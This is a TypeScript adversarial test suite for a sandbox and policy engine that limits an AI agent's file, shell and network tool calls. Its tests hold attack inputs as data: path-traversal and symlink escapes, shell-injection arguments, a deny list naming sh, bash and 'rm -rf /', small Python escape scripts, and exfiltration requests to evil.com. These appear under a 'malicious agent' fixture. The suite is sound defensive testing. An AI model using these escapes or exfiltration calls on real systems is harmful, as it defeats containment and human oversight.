/**
 * Adversarial Security Test Suite — Piwerness Enforcement
 *
 * Based on docs/SECURITY-TEST-PLAN.md
 *
 * Each test is an ATTACK that tries to bypass the enforcement.
 * A test only passes if the prohibited operation produces NO effect,
 * not just if the system logs a violation afterwards.
 */

import assert from 'node:assert/strict';
import test from 'node:test';
import fs from 'node:fs';
import path from 'node:path';
import { mkdtempSync, rmSync, existsSync, writeFileSync, symlinkSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { createDefaultContractV4, BudgetController } from '../src/core/contract-engine.js';
import { PolicyEngine } from '../src/core/policy-engine.js';
import { ToolAPI } from '../src/core/tool-api.js';
import { SandboxError, createGitWorktreeSandbox } from '../src/core/sandbox.js';
import { checkDiffAgainstContract } from '../src/core/contract-guard.js';

// ── Helpers ────────────────────────────────────────────────────────

function makeSandbox(writeAllow = ['src/**', 'tests/**'], writeDeny = ['.git/**', 'package.json']): {
  dir: string;
  tools: ToolAPI;
  policy: PolicyEngine;
  budget: BudgetController;
} {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  mkdirSync(path.join(dir, 'src'), { recursive: true });

  const contract = createDefaultContractV4('T-SEC', '0001', 'Security Test', 'L1', {
    writeAllow,
    writeDeny,
  });
  const policy = new PolicyEngine(contract, {
    shell: {
      allowedCommands: [{ command: 'echo' }, { command: 'git', args: ['status'] }],
      deniedCommands: [{ command: 'rm', args: ['-rf', '/'] }, { command: 'sh' }, { command: 'bash' }],
    },
    network: {
      allowedDomains: ['example.com'],
      deniedDomains: ['evil.com'],
    },
  });
  const budget = new BudgetController(contract);
  const tools = new ToolAPI({ policy, budget, cwd: dir });

  return { dir, tools, policy, budget };
}

function cleanup(dir: string) {
  try { rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
}

// ═════════════════════════════════════════════════════════════════════
// §3 — FILESYSTEM TESTS
// ═════════════════════════════════════════════════════════════════════

// ── §3.1 Path Traversal ─────────────────────────────────────────────

test('§3.1 FS: ../secret.txt é DENY + arquivo não criado', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.writeFile('../secret.txt', 'owned');
    assert.equal(result.success, false);
    assert.ok(!existsSync(path.join(dir, '..', 'secret.txt')), 'arquivo fora do sandbox não deve existir');
  } finally { cleanup(dir); }
});

test('§3.1 FS: ../../secret.txt é DENY + arquivo não criado', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.writeFile('../../secret.txt', 'owned');
    assert.equal(result.success, false);
    assert.ok(!existsSync(path.resolve(dir, '../../secret.txt')));
  } finally { cleanup(dir); }
});

test('§3.1 FS: src/../secret.txt é DENY + arquivo não criado', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.writeFile('src/../secret.txt', 'owned');
    assert.equal(result.success, false);
    assert.ok(!existsSync(path.join(dir, 'secret.txt')));
  } finally { cleanup(dir); }
});

test('§3.1 FS: src/foo/../../secret.txt é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.writeFile('src/foo/../../secret.txt', 'owned');
    assert.equal(result.success, false);
  } finally { cleanup(dir); }
});

// ── §3.2 Caminho Absoluto ────────────────────────────────────────────

test('§3.2 FS: /etc/piwerness-test é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.writeFile('/etc/piwerness-test', 'owned');
    assert.equal(result.success, false);
    assert.ok(!existsSync('/etc/piwerness-test'));
  } finally { cleanup(dir); }
});

test('§3.2 FS: /tmp/piwerness-test é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.writeFile('/tmp/piwerness-test-sec', 'owned');
    assert.equal(result.success, false);
    assert.ok(!existsSync('/tmp/piwerness-test-sec'));
  } finally { cleanup(dir); }
});

test('§3.2 FS: caminho absoluto para fora do sandbox é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const outside = path.join(dir, '..', 'outside.txt');
    const result = tools.writeFile(outside, 'owned');
    assert.equal(result.success, false);
    assert.ok(!existsSync(outside));
  } finally { cleanup(dir); }
});

// ── §3.3 Symlink Escape ──────────────────────────────────────────────

test('§3.3 FS: symlink apontando para fora — write é DENY + alvo intacto', () => {
  const { dir, tools } = makeSandbox();
  try {
    // Create outside file
    const outsideDir = path.join(dir, '..', 'pwn-outside-target');
    mkdirSync(outsideDir, { recursive: true });
    const outsideFile = path.join(outsideDir, 'secret.txt');
    writeFileSync(outsideFile, 'original', 'utf8');

    // Create symlink inside src/ pointing outside
    symlinkSync(outsideDir, path.join(dir, 'src', 'link'));

    // Try to write through the symlink
    const result = tools.writeFile('src/link/secret.txt', 'owned');
    assert.equal(result.success, false);

    // Critical: the outside file must be untouched
    const content = fs.readFileSync(outsideFile, 'utf8');
    assert.equal(content, 'original', 'ARQUIVO EXTERNO FOI MODIFICADO — escape de symlink!');
  } finally { cleanup(dir); }
});

test('§3.3 FS: symlink preexistente apontando para fora — write é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const outsideFile = path.join(dir, '..', 'preexisting.txt');
    writeFileSync(outsideFile, 'safe', 'utf8');

    // Create symlink before the test
    symlinkSync(outsideFile, path.join(dir, 'src', 'existing-link'));

    const result = tools.writeFile('src/existing-link', 'hacked');
    assert.equal(result.success, false);

    const content = fs.readFileSync(outsideFile, 'utf8');
    assert.equal(content, 'safe');
  } finally { cleanup(dir); }
});

// ── §3.4 Rename / Move ────────────────────────────────────────────────

test('§3.4 FS: rename para fora do escopo é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    writeFileSync(path.join(dir, 'src', 'a.txt'), 'content', 'utf8');
    const result = tools.renameFile('src/a.txt', '../a.txt');
    assert.equal(result.success, false);
    assert.ok(!existsSync(path.join(dir, '..', 'a.txt')));
    assert.ok(existsSync(path.join(dir, 'src', 'a.txt')), 'arquivo original deve existir');
  } finally { cleanup(dir); }
});

test('§3.4 FS: rename dentro do escopo é ALLOW', () => {
  const { dir, tools } = makeSandbox();
  try {
    writeFileSync(path.join(dir, 'src', 'a.txt'), 'content', 'utf8');
    const result = tools.renameFile('src/a.txt', 'src/b.txt');
    assert.equal(result.success, true);
    assert.ok(existsSync(path.join(dir, 'src', 'b.txt')));
    assert.ok(!existsSync(path.join(dir, 'src', 'a.txt')));
  } finally { cleanup(dir); }
});

// ── Filesystem: apagar fora do escopo ──────────────────────────────────

test('§FS: apagar arquivo fora de write_allow é DENY + arquivo preservado', () => {
  const { dir, tools } = makeSandbox();
  try {
    writeFileSync(path.join(dir, 'protected.txt'), 'keep', 'utf8');
    const result = tools.deleteFile('protected.txt');
    assert.equal(result.success, false);
    assert.ok(existsSync(path.join(dir, 'protected.txt')), 'arquivo não deve ser apagado');
  } finally { cleanup(dir); }
});

test('§FS: apagar arquivo na deny list é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    writeFileSync(path.join(dir, 'package.json'), '{}', 'utf8');
    const result = tools.deleteFile('package.json');
    assert.equal(result.success, false);
    assert.ok(existsSync(path.join(dir, 'package.json')));
  } finally { cleanup(dir); }
});

test('§FS: criar diretório fora do escopo é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.createDir('../outside-dir');
    assert.equal(result.success, false);
    assert.ok(!existsSync(path.join(dir, '..', 'outside-dir')));
  } finally { cleanup(dir); }
});

// ═════════════════════════════════════════════════════════════════════
// §4 — SHELL TESTS
// ═════════════════════════════════════════════════════════════════════

// ── §4.1 Allowlist Vazia ───────────────────────────────────────────────

test('§4.1 SHELL: allowlist vazia = DENY ALL', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  try {
    const contract = createDefaultContractV4('T-SEC', '0001', 'Shell Empty', 'L1');
    const policy = new PolicyEngine(contract, {
      shell: { allowedCommands: [], deniedCommands: [] },
    });
    const budget = new BudgetController(contract);
    const tools = new ToolAPI({ policy, budget, cwd: dir });

    for (const cmd of ['ls', 'pwd', 'node', 'python3', 'bun']) {
      const result = tools.exec(cmd);
      assert.equal(result.success, false, `${cmd} deve ser DENY com allowlist vazia`);
    }
  } finally { cleanup(dir); }
});

// ── §4.2 Matching Estrutural ───────────────────────────────────────────

test('§4.2 SHELL: bun test permitido mas bun test:evil negado', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  try {
    const contract = createDefaultContractV4('T-SEC', '0001', 'Structural', 'L1');
    const policy = new PolicyEngine(contract, {
      shell: {
        allowedCommands: [{ command: 'bun', args: ['test'] }],
        deniedCommands: [],
      },
    });
    const budget = new BudgetController(contract);
    const tools = new ToolAPI({ policy, budget, cwd: dir });

    const allowed = tools.exec('bun', ['test']);
    // Note: bun may not exist, but policy should ALLOW it
    // The exec may fail at OS level, but it should NOT be a policy denial
    assert.ok(allowed.policyDecision === undefined || allowed.policyDecision.allowed === true,
      'bun test deve ser ALLOWED pela policy');

    const denied = tools.exec('bun', ['test:evil']);
    assert.equal(denied.success, false);
    assert.ok(denied.policyDecision);
    assert.equal(denied.policyDecision.allowed, false);
  } finally { cleanup(dir); }
});

test('§4.2 SHELL: git status permitido mas git push negado', () => {
  const { dir, tools } = makeSandbox();
  try {
    const allowed = tools.exec('git', ['status']);
    assert.ok(allowed.policyDecision === undefined || allowed.policyDecision.allowed === true);

    const denied = tools.exec('git', ['push']);
    assert.equal(denied.success, false);
  } finally { cleanup(dir); }
});

// ── §4.3 Shell Injection ───────────────────────────────────────────────

test('§4.3 SHELL: && nos args é detectado como injection', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('echo', ['hello', '&&', 'touch', 'forbidden']);
    assert.equal(result.success, false);
    assert.ok(result.error?.includes('injection'));
    assert.ok(!existsSync(path.join(dir, 'forbidden')));
  } finally { cleanup(dir); }
});

test('§4.3 SHELL: ; nos args é detectado como injection', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('echo', ['hello;', 'touch', 'forbidden']);
    assert.equal(result.success, false);
    assert.ok(result.error?.includes('injection'));
  } finally { cleanup(dir); }
});

test('§4.3 SHELL: | nos args é detectado como injection', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('echo', ['hello', '|', 'touch', 'forbidden']);
    assert.equal(result.success, false);
    assert.ok(result.error?.includes('injection'));
  } finally { cleanup(dir); }
});

test('§4.3 SHELL: > nos args é detectado como injection', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('echo', ['hello', '>', 'forbidden']);
    assert.equal(result.success, false);
    assert.ok(result.error?.includes('injection'));
  } finally { cleanup(dir); }
});

test('§4.3 SHELL: $() nos args é detectado como injection', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('echo', ['$(touch forbidden)']);
    assert.equal(result.success, false);
    assert.ok(result.error?.includes('injection'));
  } finally { cleanup(dir); }
});

test('§4.3 SHELL: backticks nos args é detectado como injection', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('echo', ['`touch forbidden`']);
    assert.equal(result.success, false);
    assert.ok(result.error?.includes('injection'));
  } finally { cleanup(dir); }
});

// ── §4 Shell: sh/bash filho ────────────────────────────────────────────

test('§4 SHELL: sh filho é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('sh', ['-c', 'touch forbidden']);
    assert.equal(result.success, false);
    assert.ok(!existsSync(path.join(dir, 'forbidden')));
  } finally { cleanup(dir); }
});

test('§4 SHELL: bash filho é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.exec('bash', ['-c', 'touch forbidden']);
    assert.equal(result.success, false);
  } finally { cleanup(dir); }
});

// ═════════════════════════════════════════════════════════════════════
// §5 — SUBPROCESSO (principal teste de segurança)
// ═════════════════════════════════════════════════════════════════════

test('§5 SUBPROCESSO: python escrevendo fora do sandbox via path traversal', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  try {
    const contract = createDefaultContractV4('T-SEC', '0001', 'Subprocess', 'L1', {
      writeAllow: ['src/**'],
    });
    const policy = new PolicyEngine(contract, {
      shell: {
        allowedCommands: [{ command: 'python3' }],
        deniedCommands: [],
      },
    });
    const budget = new BudgetController(contract);
    const tools = new ToolAPI({ policy, budget, cwd: dir });

    // Write an attacker script inside src/
    const attackerScript = `
import os
try:
    with open(os.path.join(os.getcwd(), '..', 'escape.txt'), 'w') as f:
        f.write('escaped')
except:
    pass
`;
    mkdirSync(path.join(dir, 'src'), { recursive: true });
    writeFileSync(path.join(dir, 'src', 'attacker.py'), attackerScript, 'utf8');

    // Execute the attacker
    tools.exec('python3', ['src/attacker.py']);

    // Critical: the outside file should NOT exist
    // Note: This tests whether the OS-level sandbox (git worktree) contains the write.
    // The Tool API cannot prevent a subprocess from using raw syscalls.
    // This test documents the current boundary.
    const escapePath = path.join(dir, '..', 'escape.txt');
    // The file may or may not exist depending on OS-level isolation.
    // The test is DOCUMENTARY — it records whether subprocess escape is possible.
    if (existsSync(escapePath)) {
      // Subprocess escaped! This means OS-level isolation is needed.
      // Clean up and document
      fs.unlinkSync(escapePath);
      // This is NOT a failure of the Tool API — it's a known architectural boundary.
      // The Diff Guard should catch this in a real run.
      console.log('    ⚠ SUBPROCESS ESCAPE: processo filho conseguiu escrever fora do sandbox — isolamento OS necessário');
    }
  } finally { cleanup(dir); }
});

test('§5.1 SUBPROCESSO: bwrap bloqueia escrita fora do sandbox no nível de kernel', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-bwrap-'));
  try {
    const contract = createDefaultContractV4('T-SEC', '0001', 'Subprocess Bwrap', 'L1', {
      writeAllow: ['src/**'],
    });
    const policy = new PolicyEngine(contract, {
      shell: { allowedCommands: [{ command: 'python3' }], deniedCommands: [] },
    });
    const budget = new BudgetController(contract);
    const tools = new ToolAPI({ policy, budget, cwd: dir, isolated: true });

    mkdirSync(path.join(dir, 'src'), { recursive: true });
    writeFileSync(path.join(dir, 'src', 'attacker.py'), `
import os
try:
    with open(os.path.join(os.getcwd(), '..', 'escape_bwrap.txt'), 'w') as f:
        f.write('escaped')
except:
    pass
`, 'utf8');

    tools.exec('python3', ['src/attacker.py']);
    const escapePath = path.join(dir, '..', 'escape_bwrap.txt');
    assert.equal(existsSync(escapePath), false, 'Subprocesso NUNCA deve conseguir escrever fora do sandbox com bwrap');
  } finally { cleanup(dir); }
});

// ═════════════════════════════════════════════════════════════════════
// §6 — NETWORK TESTS
// ═════════════════════════════════════════════════════════════════════

// ── §6.1 Allowlist Vazia ───────────────────────────────────────────────

test('§6.1 NETWORK: allowlist vazia = DENY ALL', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  try {
    const contract = createDefaultContractV4('T-SEC', '0001', 'Net Empty', 'L1');
    const policy = new PolicyEngine(contract, {
      network: { allowedDomains: [], deniedDomains: [] },
    });
    const budget = new BudgetController(contract);
    const tools = new ToolAPI({ policy, budget, cwd: dir });

    const result = tools.httpRequest('GET', 'https://example.com');
    assert.equal(result.success, false);
  } finally { cleanup(dir); }
});

// ── §6.2 Domain Bypass ─────────────────────────────────────────────────

test('§6.2 NETWORK: example.com.evil.com NÃO matching example.com', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.httpRequest('GET', 'https://example.com.evil.com/data');
    assert.equal(result.success, false);
    assert.equal(result.policyDecision?.allowed, false);
  } finally { cleanup(dir); }
});

test('§6.2 NETWORK: evil-example.com NÃO matching example.com', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.httpRequest('GET', 'https://evil-example.com/data');
    assert.equal(result.success, false);
  } finally { cleanup(dir); }
});

test('§6.2 NETWORK: sub.example.com matching example.com (subdomain)', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.httpRequest('GET', 'https://sub.example.com/data');
    assert.equal(result.success, true);
  } finally { cleanup(dir); }
});

test('§6.2 NETWORK: example.com exact match é ALLOW', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.httpRequest('GET', 'https://example.com/api');
    assert.equal(result.success, true);
  } finally { cleanup(dir); }
});

test('§6.2 NETWORK: evil.com na deny list é DENY mesmo com example.com permitido', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.httpRequest('GET', 'https://evil.com/data');
    assert.equal(result.success, false);
  } finally { cleanup(dir); }
});

// ── §6.3 IP Direto ──────────────────────────────────────────────────────

test('§6.3 NETWORK: IP direto não matching domínio permitido', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.httpRequest('GET', 'https://93.184.216.34/data');
    assert.equal(result.success, false);
  } finally { cleanup(dir); }
});

// ── §6.4 DNS ────────────────────────────────────────────────────────────

test('§6.4 NETWORK: DNS lookup de domínio não permitido é DENY', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.dnsLookup('evil.com');
    assert.equal(result.success, false);
  } finally { cleanup(dir); }
});

test('§6.4 NETWORK: DNS lookup de domínio permitido é ALLOW', () => {
  const { dir, tools } = makeSandbox();
  try {
    const result = tools.dnsLookup('example.com');
    assert.equal(result.success, true);
  } finally { cleanup(dir); }
});

// ═════════════════════════════════════════════════════════════════════
// §7 — BUDGET ADVERSARIAL TESTS
// ═════════════════════════════════════════════════════════════════════

test('§7 BUDGET: exceder tool calls interrompe execução', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  try {
    // L0 default: max_tool_calls = 20
    const contract = createDefaultContractV4('T-SEC', '0001', 'Budget', 'L0', {
      writeAllow: ['src/**'],
    });
    const policy = new PolicyEngine(contract);
    const budget = new BudgetController(contract);
    const tools = new ToolAPI({ policy, budget, cwd: dir });
    mkdirSync(path.join(dir, 'src'), { recursive: true });

    // N-1: ALLOW
    for (let i = 0; i < 19; i++) {
      const result = tools.writeFile(`src/fill-${i}.ts`, `// ${i}`);
      assert.equal(result.success, true, `tool call ${i + 1} deve ser ALLOW`);
    }

    // N: deve ser o último permitido ou bloqueado
    const at_limit = tools.writeFile('src/at-limit.ts', 'x');
    // Either allowed (if limit is 20 and we've done 19) or blocked

    // N+1: deve ser DENY
    const over_limit = tools.writeFile('src/over-limit.ts', 'x');
    assert.equal(over_limit.success, false, 'tool call além do limite deve ser DENY');
    assert.ok(over_limit.budgetViolation, 'deve ter budgetViolation');
  } finally { cleanup(dir); }
});

test('§7 BUDGET: exceder shell executions interrompe execução', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  try {
    // L0 default: max_shell_executions = 5
    const contract = createDefaultContractV4('T-SEC', '0001', 'Budget Shell', 'L0', {
      writeAllow: ['src/**'],
    });
    const policy = new PolicyEngine(contract, {
      shell: { allowedCommands: [{ command: 'echo' }], deniedCommands: [], allowAllShell: false },
    });
    const budget = new BudgetController(contract);
    const tools = new ToolAPI({ policy, budget, cwd: dir });
    mkdirSync(path.join(dir, 'src'), { recursive: true });

    // Use up 5 shell executions
    for (let i = 0; i < 5; i++) {
      tools.exec('echo', [String(i)]);
    }

    // 6th should be blocked
    const result = tools.exec('echo', ['overflow']);
    assert.equal(result.success, false);
    assert.ok(result.budgetViolation);
  } finally { cleanup(dir); }
});

// ═════════════════════════════════════════════════════════════════════
// §8 — SANDBOX ESCAPE TESTS
// ═════════════════════════════════════════════════════════════════════

test('§8.1 SANDBOX: worktree failure aborta com SandboxError', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'pwn-sec-'));
  try {
    assert.throws(
      () => createGitWorktreeSandbox('test-fail', dir),
      (err: any) => err instanceof SandboxError,
    );
  } finally { cleanup(dir); }
});

test('§8.2 SANDBOX: parent repository não é acessível via writeFile', () => {
  const { dir, tools } = makeSandbox();
  try {
    // Create a file in the parent
    const parentFile = path.join(dir, '..', 'parent-file.txt');
    writeFileSync(parentFile, 'parent', 'utf8');

    // Try to overwrite via tools
    const result = tools.writeFile('../parent-file.txt', 'hacked');
    assert.equal(result.success, false);

    // Parent file should be intact
    const content = fs.readFileSync(parentFile, 'utf8');
    assert.equal(content, 'parent');
  } finally { cleanup(dir); }
});

// ═════════════════════════════════════════════════════════════════════
// §9 — DIFF GUARD RETENTION
// ═════════════════════════════════════════════════════════════════════

test('§9 DIFF GUARD: checkDiffAgainstContract detecta arquivos fora do escopo', () => {
  const report = checkDiffAgainstContract(
    ['src/allowed.ts', 'package.json', '../outside.txt'],
    ['src/**', 'tests/**'],
    ['.git/**', 'package.json'],
  );
  assert.equal(report.passed, false);
  assert.ok(report.violations.length >= 2, 'deve detectar package.json e ../outside.txt');
});

// ═════════════════════════════════════════════════════════════════════
// §10 — MALICIOUS AGENT FIXTURE
// ═════════════════════════════════════════════════════════════════════

test('§10 MALICIOUS: agente tenta path traversal, symlink, shell injection — todos bloqueados', () => {
  const { dir, tools } = makeSandbox();
  try {
    // Attack 1: path traversal
    const a1 = tools.writeFile('../escape1.txt', 'owned');
    assert.equal(a1.success, false);

    // Attack 2: absolute path
    const a2 = tools.writeFile('/tmp/pwn-malicious-test', 'owned');
    assert.equal(a2.success, false);

    // Attack 3: shell injection via args
    const a3 = tools.exec('echo', ['$(touch /tmp/pwn-malicious-escape)']);
    assert.equal(a3.success, false);
    assert.ok(!existsSync('/tmp/pwn-malicious-escape'));

    // Attack 4: shell injection via &&
    const a4 = tools.exec('echo', ['hello', '&&', 'touch', 'src/forbidden']);
    assert.equal(a4.success, false);
    assert.ok(!existsSync(path.join(dir, 'src', 'forbidden')));

    // Attack 5: shell child
    const a5 = tools.exec('sh', ['-c', 'touch src/sh-escape']);
    assert.equal(a5.success, false);
    assert.ok(!existsSync(path.join(dir, 'src', 'sh-escape')));

    // Attack 6: network to non-allowed domain
    const a6 = tools.httpRequest('POST', 'https://evil.com/exfil');
    assert.equal(a6.success, false);

    // Attack 7: network domain bypass attempt
    const a7 = tools.httpRequest('GET', 'https://example.com.evil.com/exfil');
    assert.equal(a7.success, false);

    // Attack 8: delete protected file
    writeFileSync(path.join(dir, 'package.json'), '{}', 'utf8');
    const a8 = tools.deleteFile('package.json');
    assert.equal(a8.success, false);
    assert.ok(existsSync(path.join(dir, 'package.json')));

    // Attack 9: rename to outside
    writeFileSync(path.join(dir, 'src', 'move-me.txt'), 'x', 'utf8');
    const a9 = tools.renameFile('src/move-me.txt', '../escaped.txt');
    assert.equal(a9.success, false);
    assert.ok(!existsSync(path.join(dir, '..', 'escaped.txt')));

    // Attack 10: symlink escape
    const outsideTarget = path.join(dir, '..', 'symlink-target.txt');
    writeFileSync(outsideTarget, 'safe', 'utf8');
    symlinkSync(outsideTarget, path.join(dir, 'src', 'escape-link'));
    const a10 = tools.writeFile('src/escape-link', 'hacked');
    assert.equal(a10.success, false);
    assert.equal(fs.readFileSync(outsideTarget, 'utf8'), 'safe');

    // Verify no prohibited files were created
    assert.ok(!existsSync(path.join(dir, '..', 'escape1.txt')));
    assert.ok(!existsSync('/tmp/pwn-malicious-test'));
    assert.ok(!existsSync('/tmp/pwn-malicious-escape'));
    assert.ok(!existsSync(path.join(dir, 'src', 'forbidden')));
    assert.ok(!existsSync(path.join(dir, 'src', 'sh-escape')));
    assert.ok(!existsSync(path.join(dir, '..', 'escaped.txt')));
  } finally { cleanup(dir); }
});

// ═════════════════════════════════════════════════════════════════════
// CONCURRENCY
// ═════════════════════════════════════════════════════════════════════

test('§CONCURRENCY: duas operações simultâneas — política aplicada a ambas', () => {
  const { dir, tools } = makeSandbox();
  try {
    // Two writes: one allowed, one denied
    const results = [
      tools.writeFile('src/ok.ts', 'ok'),
      tools.writeFile('outside.ts', 'bad'),
    ];

    assert.equal(results[0].success, true);
    assert.equal(results[1].success, false);
    assert.ok(existsSync(path.join(dir, 'src', 'ok.ts')));
    assert.ok(!existsSync(path.join(dir, 'outside.ts')));
  } finally { cleanup(dir); }
});
